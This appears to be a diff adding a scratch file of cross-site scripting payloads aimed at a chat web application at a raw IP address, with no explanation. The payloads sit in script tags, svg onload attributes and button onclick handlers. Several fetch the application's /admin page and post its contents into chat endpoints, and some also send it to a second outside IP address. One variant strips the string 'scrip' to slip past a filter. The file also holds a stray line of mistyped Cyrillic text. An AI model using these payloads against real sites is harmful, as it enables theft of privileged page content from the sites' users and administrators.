@@ -1,0 +1,80 @@
+<script>
+function kek() {
+<svg onload="var http = new XMLHttpRequest();
+http.open('GET', 'http://51.68.126.197:7779/admin', false);
+http.send();
+alert(http.responseText);
+var http1 = new XMLHttpRequest();
+http1.open('POST', 'http://51.68.126.197:7779/chat/mark1/', false);
+http1.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+http1.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+http1.send('message=' + http.responseText);
+var http2 = new XMLHttpRequest();
+http2.open('POST', 'http://93.175.2.143', false);
+http2.send(http.responseText);">
+}
+</script>
+<button onclick = 'kek()'>KEK</button>
+
+<script>
+var http = new XMLHttpRequest();
+http.open('GET', 'http://51.68.126.197:7779/admin', false);
+http.send();
+var http1 = new XMLHttpRequest();
+http1.open('POST', 'http://51.68.126.197:7778/chat/admin/', false);
+http1.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+http1.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+http1.send('message=' + http.responseText);
+</script>
+
+<script>
+function kek() {
+var http = new XMLHttpRequest();
+http.open('GET', 'http://51.68.126.197:7779/admin', true);
+http.send();
+alert(http.responseText)
+var http1 = new XMLHttpRequest();
+http1.open('POST', 'http://51.68.126.197:7778/chat/admin/', false);
+http1.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+http1.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+http1.send('message=' + http.responseText);
+}
+</script>
+<button onclick='kek()'>KEK</button>
+
+javascript:var http = new XMLHttpRequest();
+
+<button onclick='alert();
+http.open('GET', 'http://51.68.126.197:7779/admin', false);
+http.send();
+var http1 = new XMLHttpRequest();
+http1.open('POST', 'http://51.68.126.197:7779/chat/admin/', false);
+http1.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+http1.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+http1.send('message=' + http.responseText);'>LOL</button>
+
+<button onclick="alert();http.open('GET', 'http://51.68.126.197:7779/admin', false);http.send();var http1 = new XMLHttpRequest();http1.open('POST', 'http://51.68.126.197:7779/chat/admin/', false);http1.setRequestHeader('X-Requested-With','XMLHttpRequest');http1.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');http1.send('message=' + http.responseText);">LOL</button>
+
+
+<button onclick="alert(1 + 1);alert(2 + 2);">KEK</button>
+Бымп щтдщфв=Э
+
+<svg onload="var http = new XMLHttpRequest();
+http.open('GET', 'http://51.68.126.197:7779/admin', false);
+http.send();
+var http2 = new XMLHttpRequest();
+http2.open('POST', 'http://93.175.2.143', false);
+http2.send(http.responseText);">
+
+
+<svg onload="var http = new XMLHttpRequest();
+http.open('GET', 'http://51.68.126.197:7779/admin', false);
+http.send();
+var mess = http.responseText;
+mess = mess.replace(/scrip/g, '');
+var http1 = new XMLHttpRequest();
+http1.open('POST', 'http://51.68.126.197:7779/chat/mark13/', false);
+http1.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+http1.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+http1.send('message=' + mess);
+alert(mess);">
